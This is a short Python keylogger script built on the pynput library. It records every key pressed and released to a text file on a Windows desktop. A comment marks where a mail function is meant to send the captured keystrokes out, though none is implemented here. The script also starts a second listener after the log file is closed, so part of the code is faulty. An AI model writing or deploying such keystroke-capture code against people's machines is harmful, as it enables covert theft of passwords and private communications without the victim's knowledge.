from pynput import keyboard

keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "w")


def on_press(key):
    try:
        keys.write('alphanumeric key {0} pressed\n'.format(
            key.char))
    except AttributeError:
        keys.write('special key {0} pressed\n'.format(
            key))


def on_release(key):
    keys.write('{0} released\n'.format(
        key))

    if key == keyboard.Key.esc:
        keys.close()
        # here we call the mail function
        # Stop listener
        return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()


# ... or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
